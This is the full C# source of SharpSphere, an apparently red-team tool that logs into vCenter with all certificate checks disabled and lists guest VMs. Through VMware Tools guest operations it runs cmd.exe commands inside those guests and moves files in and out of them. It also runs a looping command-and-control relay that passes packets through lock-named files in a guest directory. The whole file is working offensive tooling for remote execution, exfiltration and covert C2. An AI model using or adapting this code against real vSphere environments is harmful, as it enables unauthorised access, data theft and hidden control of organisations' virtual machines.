using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Cache;
using CommandLine;

namespace SharpSphere
{
    using System.Linq;
    using vSphere;

    internal class Program
    {
        private static ManagedObjectReference guestFileManager;
        private static VimPortTypeClient vim;
        private static ManagedObjectReference vm;
        private static ServiceContent serviceContent;
        private static NamePasswordAuthentication creds;
        static void Log(string a)
        {
            Console.WriteLine(a);
        }
        static void Error(Exception e)
        {
            Log("Error: " + e.Message);
            System.Environment.Exit(1);
        }


        static void Connect(string url, string username, string password, string ip)
        {
            try
            {
                //Disable SSL
                Log("[x] Disabling SSL checks in case vCenter is using untrusted/self-signed certificates");
                System.Net.ServicePointManager.ServerCertificateValidationCallback = ((sender, certificate, chain, sslPolicyErrors) => true);

                //Create the vCenter API object
                Log("[x] Creating vSphere API interface, takes a few minutes...");
                var binding = new System.ServiceModel.BasicHttpsBinding
                {
                    AllowCookies = true

                };
                binding.Security.Mode = System.ServiceModel.BasicHttpsSecurityMode.Transport;
                var endpoint = new System.ServiceModel.EndpointAddress(url);
                vim = new VimPortTypeClient(binding, endpoint);
                var moref = new ManagedObjectReference
                {
                    type = "ServiceInstance",
                    Value = "ServiceInstance",
                };

                //Bind to vCenter
                serviceContent = vim.RetrieveServiceContent(moref);
                Log("[x] Connected to " + serviceContent.about.fullName);

                //Authenticate to vCenter API

                UserSession userSession = vim.Login(serviceContent.sessionManager, username, password, null);
                if (userSession is null)
                    Error(new Exception("Failed to authenticate."));
                Log("[x] Successfully authenticated");

                //Retrieve filemanager
                guestFileManager = GetProperty<ManagedObjectReference>(serviceContent.guestOperationsManager, "fileManager"); 
                if (guestFileManager is null)
                    Error(new Exception("Failed to retrieve filemanager"));

                //Get the current session and check it's valid
                UserSession currentSession = GetProperty<UserSession>(serviceContent.sessionManager, "currentSession"); 
                if (currentSession is null || currentSession.key != userSession.key)
                    Error(new Exception("Failed to retrieve current session"));

                //Retrieve target VM
                if (ip != null)
                    vm = vim.FindByIp(serviceContent.searchIndex, null, ip, true);
                
            }
            catch (Exception fault) //Generic catch all
            {
                Error(fault);
            }
        }
        static void ExecuteCommand(NamePasswordAuthentication creds, string arguments, string programPath, string workingDirectory, bool output)
        {
            try
            {
                ManagedObjectReference processManager = GetProperty<ManagedObjectReference>(serviceContent.guestOperationsManager, "processManager");

                var guestProgramSpec = new GuestProgramSpec()
                {
                    arguments = arguments,
                    programPath = programPath,
                    workingDirectory = workingDirectory,
                };

                if (output)
                {
                    //Set file to receive output
                    var outfile = Path.GetRandomFileName();
                    guestProgramSpec.arguments += @" > C:\Users\Public\" + outfile + @" 2>&1";

                    //Start the program and receive the PID back
                    Log("[x] Attempting to run cmd with the following arguments: " + guestProgramSpec.arguments);
                    Log(@"[x] Temporarily saving out to C:\Users\Public\" + outfile);
                    long pid = vim.StartProgramInGuest(processManager, vm, creds, guestProgramSpec);

                    //Display PID
                    Log("[x] Process started with PID " + pid + " waiting for execution to finish");

                    bool finished = false;
                    while (!finished)
                    {
                        //Get status of our process
                        long[] pids = { pid };
                        GuestProcessInfo[] guestProcessInfo = vim.ListProcessesInGuest(processManager, vm, creds, pids);
                        if (guestProcessInfo.Length == 0)
                        {
                            Log("Error retrieving status of the process, check for the existance of the output file manually");
                        }
                        if (guestProcessInfo[0].exitCodeSpecified)
                        {
                            Log("[x] Execution finished, attempting to retrieve the results");
                            //Get the results
                            var fileTransferInformation = vim.InitiateFileTransferFromGuest(guestFileManager, vm, creds, @"C:\Users\Public\" + outfile);
                            using (var client = new System.Net.WebClient())
                            {
                                client.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
                                var results = client.DownloadString(fileTransferInformation.url);
                                Log("[x] Output: ");
                                Log(results);
                            }

                            //Delete the file
                            vim.DeleteFileInGuest(guestFileManager, vm, creds, @"C:\Users\Public\" + outfile);
                            Log("[x] Output file deleted");

                            finished = true;
                        }
                    }
                }
                else
                {

                    //Start the program and receive the PID back
                    Log("[x] Attempting to execute with cmd /c the following command: " + guestProgramSpec.arguments);
                    long pid = vim.StartProgramInGuest(processManager, vm, creds, guestProgramSpec);

                    //Display PID
                    Log("[x] Process started with PID" + pid);
                }

            }
            catch (Exception fault)
            {
                Error(fault);
            }
        }

        static int Execute(ExecuteOptions options)
        {
            try
            {
                //Connect to target VM
                Connect(options.url, options.username, options.password, options.ip);
                //Build credential object to authenticate to guest OS
                creds = new NamePasswordAuthentication()
                {
                    username = options.guestusername,
                    password = options.guestpassword,
                    interactiveSession = false,
                };
                ExecuteCommand(creds, "/c " + options.command, @"C:\Windows\System32\cmd.exe", @"C:\Users\Public", options.output);
            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }

        static int List(ListOptions options)
        {
            try
            {
                //Connect to target 
                Connect(options.url, options.username, options.password, null);

                //Connect to target VM
                var childEntities = GetProperty<ManagedObjectReference[]>(serviceContent.rootFolder, "childEntity");
                var datacenters = childEntities.Where(e => e.type == "Datacenter");
                foreach (var datacenter in datacenters)
                {
                    var vmFolder = GetProperty<ManagedObjectReference>(datacenter, "vmFolder");
                    var datacenterVms = ScanForVms(vmFolder);

                    foreach (var vm in datacenterVms)
                    {
                        GuestInfo guest = GetProperty<GuestInfo>(vm, "guest");
                        var networks = GetProperty<ManagedObjectReference[]>(vm, "network");
                        if (guest.guestOperationsReady)
                        {
                            Console.WriteLine("Hostname: " + guest.hostName + " | OS: " + guest.guestFullName + " | Tools: " + guest.toolsVersionStatus2 + " | IP: " + guest.ipAddress);
                        }
                    }
                }
            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }

        static void ScanForVmsRecurse(ManagedObjectReference obj, int depth, List<ManagedObjectReference> vms)
        {
            if (depth > 10)
            {
                return;
            }
            else if (obj.type == "VirtualMachine")
            {
                vms.Add(obj);
            }
            else if (obj.type == "Folder")
            {
                var children = GetProperty<ManagedObjectReference[]>(obj, "childEntity");
                foreach (var child in children)
                    ScanForVmsRecurse(child, depth + 1, vms);
            }
            else if (obj.type == "VirtualApp")
            {
                var vmList = GetProperty<ManagedObjectReference[]>(obj, "vm");
                foreach (var v in vmList)
                    ScanForVmsRecurse(v, depth + 1, vms);
            }
        }
        static List<ManagedObjectReference> ScanForVms(ManagedObjectReference folder)
        {
            var vms = new List<ManagedObjectReference>();
            ScanForVmsRecurse(folder, 0, vms);
            return vms;
        }


        private static PropertyFilterSpec[] GetSinglePropSpec(ManagedObjectReference from, string propName)
        {
            return new PropertyFilterSpec[]
            {
                new PropertyFilterSpec
                {
                    objectSet = new ObjectSpec[]
                    {
                        new ObjectSpec
                        {
                            obj = from,
                        },
                    },
                    propSet = new PropertySpec[]
                    {
                        new PropertySpec
                        {
                            type = from.type,
                            pathSet = new string[] { propName },
                        },
                    },
                     reportMissingObjectsInResults = true,
                     reportMissingObjectsInResultsSpecified = true,
                }
            };
        }
        private static T GetProperty<T>(ManagedObjectReference from, string propName) where T : class
        {
            var result = vim.RetrievePropertiesEx(serviceContent.propertyCollector, GetSinglePropSpec(from, propName), new RetrieveOptions() { });
            if (result is null)
                Error(new Exception("RetrievePropertiesEx failed"));
            return result.objects[0].propSet[0].val as T;
        }



        static void UploadFile(NamePasswordAuthentication creds, string source, string destination)
        {
            try
            {
                byte[] data = System.IO.File.ReadAllBytes(source);
                var fileTransferUrl = vim.InitiateFileTransferToGuest(guestFileManager, vm, creds, destination, new GuestFileAttributes(), data.Length, true);
                using (var client = new System.Net.WebClient())
                {
                    client.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
                    Log("[x] Starting upload of " + source + " to " + destination + "...");
                    client.UploadFile(fileTransferUrl, "PUT", source);
                    Log("[x] Uploaded " + source + " to " + destination + " on the guest");
                }
            }
            catch (Exception fault)
            {
                Error(fault);
            }
        }
        static int Upload(UploadOptions options)
        {
            try
            {
                //Connect to target VM
                Connect(options.url, options.username, options.password, options.ip);
                //Build credential object to authenticate to guest OS
                creds = new NamePasswordAuthentication()
                {
                    username = options.guestusername,
                    password = options.guestpassword,
                    interactiveSession = false,
                };
                UploadFile(creds, options.source, options.destination);
            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }
        static void DownloadFile(NamePasswordAuthentication creds, string source, string destination)
        {
            try
            {
                var fileTransferInformation = vim.InitiateFileTransferFromGuest(guestFileManager, vm, creds, source);
                using (var client = new System.Net.WebClient())
                {
                    client.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
                    client.DownloadFile(fileTransferInformation.url, destination);
                    Log("[x] Downloaded " + source + " to " + destination + " on this machine");
                }
            }
            catch (Exception fault)
            {
                Error(fault);
            }
        }
        static int Download(DownloadOptions options)
        {
            try
            {
                //Connect to target VM
                Connect(options.url, options.username, options.password, options.ip);
                //Build credential object to authenticate to guest OS
                creds = new NamePasswordAuthentication()
                {
                    username = options.guestusername,
                    password = options.guestpassword,
                    interactiveSession = false,
                };
                DownloadFile(creds, options.source, options.destination);
            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }
        static int StartC2(C2Options options)
        {
            try
            {
                //Connect to target VM
                Connect(options.url, options.username, options.password, options.ip);
                //Build credential object to authenticate to guest OS
                creds = new NamePasswordAuthentication()
                {
                    username = options.guestusername,
                    password = options.guestpassword,
                    interactiveSession = false,
                };

                if (!Directory.Exists(options.localdir))
                {
                    Error(new Exception("Cannot read local dir " + options.localdir));

                }

                //Make sure paths have a trailing slash
                if (!options.localdir.EndsWith("\\"))
                {
                    options.localdir += "\\";
                }
                if (!options.guestdir.EndsWith("\\"))
                {
                    options.guestdir += "\\";
                }
                while (true)
                {
                    string[] sourceFilePaths = Directory.GetFiles(options.localdir);
                    if (!Array.Exists(sourceFilePaths, element => element.Contains("lock")) && Array.Exists(sourceFilePaths, element => element.Contains(options.outputid)))
                    {
                        foreach (string sourceFilePath in sourceFilePaths)
                        {
                            var fileName = Path.GetFileName(sourceFilePath);
                            byte[] data = System.IO.File.ReadAllBytes(sourceFilePath);
                            var newFilePath = options.guestdir + fileName;
                            var fileTransferUrl = vim.InitiateFileTransferToGuest(guestFileManager, vm, creds, newFilePath + ".lock", new GuestFileAttributes(), data.Length, true);
                            using (var client = new System.Net.WebClient())
                            {
                                client.UploadData(fileTransferUrl, "PUT", data);
                                Log("[x] Uploaded a packet to guest");
                            }
                            vim.MoveFileInGuest(guestFileManager, vm, creds, newFilePath + ".lock", newFilePath, true);
                            File.Delete(sourceFilePath);
                        }
                    }
                    GuestListFileInfo guestFilesRaw = vim.ListFilesInGuest(guestFileManager, vm, creds, options.guestdir, 0, 999, options.inputid + "*");
                    if (guestFilesRaw.files != null)
                    {
                        bool lockFilePresent = false;

                        foreach (GuestFileInfo guestFile in guestFilesRaw.files)
                        {
                            if (guestFile.path.Contains("lock"))
                            {
                                lockFilePresent = true;
                                break;
                            }
                        }
                        if (!lockFilePresent)
                        {
                            foreach (GuestFileInfo guestFile in guestFilesRaw.files)
                            {
                                if (guestFile.type == "file" && !guestFile.path.Contains("lock"))
                                {
                                    var fileTransferInformation = vim.InitiateFileTransferFromGuest(guestFileManager, vm, creds, options.guestdir + guestFile.path);
                                    string newFilePath = options.localdir + guestFile.path;
                                    using (var client = new System.Net.WebClient())
                                    {
                                        Log("[x] Downloading a packet from guest");
                                        client.DownloadFile(fileTransferInformation.url, newFilePath + @".lock");
                                    }
                                    File.Move(newFilePath + @".lock", newFilePath);
                                    vim.DeleteFileInGuest(guestFileManager, vm, creds, options.guestdir + guestFile.path);
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception fault)
            {
                Error(fault);
            }
            return 0;
        }



        public static void Main(string[] args)
        {
            Parser.Default.ParseArguments<ListOptions, ExecuteOptions, C2Options, UploadOptions, DownloadOptions>(args).MapResult(
                (ListOptions options) => List(options),
                (ExecuteOptions options) => Execute(options),
                (C2Options options) => StartC2(options),
                (UploadOptions options) => Upload(options),
                (DownloadOptions options) => Download(options),
                errors => 1);

        }


    }
}
